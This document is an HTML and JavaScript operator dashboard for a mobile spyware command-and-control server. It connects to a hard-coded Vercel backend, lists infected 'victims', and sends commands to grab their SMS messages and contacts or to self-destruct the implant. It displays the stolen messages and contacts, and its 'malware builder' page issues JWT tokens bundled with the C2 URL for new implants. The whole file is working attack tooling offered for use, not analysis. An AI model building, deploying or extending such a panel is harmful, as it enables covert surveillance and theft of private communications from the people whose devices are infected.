<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quantum C2 Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2a 100%); min-height: 100vh; }
        .header { background: #000; padding: 20px 30px; border-bottom: 2px solid #0f0; display: flex; justify-content: space-between; align-items: center; }
        .logo h1 { color: #0f0; font-size: 28px; }
        .stats { display: flex; gap: 20px; }
        .stat-card { background: rgba(0,255,0,0.1); border: 1px solid #0f0; border-radius: 12px; padding: 15px 25px; text-align: center; }
        .stat-number { color: #0f0; font-size: 32px; font-weight: bold; }
        .container { display: flex; max-width: 1400px; margin: 0 auto; padding: 20px; gap: 20px; }
        .sidebar { width: 250px; background: rgba(0,0,0,0.6); border-radius: 16px; padding: 15px; }
        .menu-item { padding: 12px 20px; margin: 5px 0; border-radius: 10px; cursor: pointer; color: #aaa; }
        .menu-item:hover { background: rgba(0,255,0,0.1); color: #0f0; }
        .menu-item.active { background: #0f0; color: #000; }
        .content { flex: 1; }
        .victim-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 20px; }
        .victim-card { background: #111; border-radius: 16px; padding: 20px; border: 1px solid rgba(0,255,0,0.3); cursor: pointer; }
        .victim-card:hover { border-color: #0f0; }
        .victim-name { color: #0f0; font-size: 18px; font-weight: bold; }
        .command-bar { display: flex; flex-wrap: wrap; gap: 8px; margin-top: 15px; padding-top: 15px; border-top: 1px solid #333; }
        .cmd-btn { background: rgba(0,255,0,0.1); border: 1px solid #0f0; color: #0f0; padding: 5px 12px; border-radius: 20px; cursor: pointer; }
        .cmd-btn:hover { background: #0f0; color: #000; }
        .cmd-btn.danger { border-color: #f00; color: #f00; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background: #1a1a2a; border-radius: 20px; width: 90%; max-width: 800px; max-height: 80vh; overflow-y: auto; padding: 20px; border: 1px solid #0f0; }
        .data-item { background: #111; border-radius: 10px; padding: 10px; margin: 8px 0; border-left: 3px solid #0f0; }
        .builder-box { background: rgba(0,0,0,0.6); border-radius: 20px; padding: 30px; max-width: 500px; margin: 0 auto; }
        .builder-input { width: 100%; background: #111; border: 1px solid #0f0; border-radius: 10px; padding: 12px; color: #0f0; margin: 10px 0; }
        .generate-btn { background: #0f0; color: #000; border: none; padding: 14px; border-radius: 30px; font-weight: bold; width: 100%; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo"><h1>QUANTUM C2 v14.0</h1></div>
        <div class="stats" id="stats"></div>
    </div>
    <div class="container">
        <div class="sidebar">
            <div class="menu-item active" onclick="showPage('dashboard')">DASHBOARD</div>
            <div class="menu-item" onclick="showPage('builder')">MALWARE BUILDER</div>
        </div>
        <div class="content" id="contentArea"></div>
    </div>
    <div id="victimModal" class="modal">
        <div class="modal-content">
            <div style="display:flex; justify-content:space-between"><h2 style="color:#0f0" id="modalTitle">Details</h2><span onclick="closeModal()" style="color:#f00;cursor:pointer">X</span></div>
            <div id="modalBody"></div>
        </div>
    </div>
    <script>
        const API_BASE = 'https://hmmmnasugirengseadsadsa.vercel.app';
        async function apiCall(endpoint, method='GET', data=null) {
            const opts = { method, headers: { 'Content-Type': 'application/json' } };
            if(data) opts.body = JSON.stringify(data);
            const res = await fetch(API_BASE + '/api' + endpoint, opts);
            return res.json();
        }
        async function loadStats() {
            const stats = await apiCall('/stats');
            document.getElementById('stats').innerHTML = '<div class="stat-card"><div class="stat-number">'+(stats.total_victims||0)+'</div><div class="stat-label">VICTIMS</div></div><div class="stat-card"><div class="stat-number">'+(stats.online_victims||0)+'</div><div class="stat-label">ONLINE</div></div>';
        }
        async function renderDashboard() {
            const victims = await apiCall('/victims');
            let html = '<div class="victim-grid">';
            for(let v of victims) {
                html += '<div class="victim-card" onclick="openVictimModal(\''+v.device_id+'\')"><div class="victim-name"> '+v.device_model+'</div><div class="command-bar"><button class="cmd-btn" onclick="event.stopPropagation(); sendCommand(\''+v.device_id+'\',\'GET_SMS\')">GET SMS</button><button class="cmd-btn" onclick="event.stopPropagation(); sendCommand(\''+v.device_id+'\',\'GET_CONTACTS\')">GET CONTACTS</button><button class="cmd-btn danger" onclick="event.stopPropagation(); sendCommand(\''+v.device_id+'\',\'SELF_DESTROY\')">DESTROY</button></div></div>';
            }
            html += '</div>';
            document.getElementById('contentArea').innerHTML = html;
            loadStats();
        }
        async function renderBuilder() {
            document.getElementById('contentArea').innerHTML = '<div class="builder-box"><h2 style="color:#0f0">GENERATE JWT</h2><input type="text" id="deviceId" class="builder-input" placeholder="Device ID" value="device_'+Math.random().toString(36).substr(2,8)+'"><button class="generate-btn" onclick="generateJWT()">GENERATE</button><div id="genResult"></div></div>';
        }
        async function generateJWT() {
            const deviceId = document.getElementById('deviceId').value;
            const res = await apiCall('/generate_jwt', 'POST', { device_id: deviceId });
            document.getElementById('genResult').innerHTML = '<textarea style="width:100%;background:#111;color:#0f0;padding:10px" rows="4" readonly>JWT_TOKEN='+res.token+'\nC2_SERVER=https://hmmmnasugirengseadsadsa.vercel.app\nDEVICE_ID='+deviceId+'</textarea>';
        }
        async function sendCommand(deviceId, cmd) { await apiCall('/command', 'POST', { device_id: deviceId, command: cmd }); alert(cmd+' sent!'); }
        async function openVictimModal(deviceId) {
            const victims = await apiCall('/victims');
            const v = victims.find(x=>x.device_id===deviceId);
            if(!v) return;
            document.getElementById('modalTitle').innerHTML = v.device_model;
            let smsHtml = '<h3>SMS ('+(v.sms?.length||0)+')</h3>';
            if(v.sms) {
                for(let s of v.sms.slice(-20).reverse()) smsHtml += '<div class="data-item">'+s.address+'<br>'+s.body+'</div>';
            }
            let contactsHtml = '<h3>CONTACTS ('+(v.contacts?.length||0)+')</h3>';
            if(v.contacts) {
                for(let c of v.contacts) contactsHtml += '<div class="data-item">'+c.name+': '+c.number+'</div>';
            }
            document.getElementById('modalBody').innerHTML = smsHtml + contactsHtml;
            document.getElementById('victimModal').style.display = 'flex';
        }
        function closeModal() { document.getElementById('victimModal').style.display = 'none'; }
        function showPage(page) {
            document.querySelectorAll('.menu-item').forEach(el=>el.classList.remove('active'));
            event.target.classList.add('active');
            if(page==='dashboard') renderDashboard();
            else renderBuilder();
        }
        showPage('dashboard');
        setInterval(()=>{ if(document.querySelector('.menu-item.active').innerText.includes('DASHBOARD')) renderDashboard(); }, 5000);
    </script>
</body>
</html>
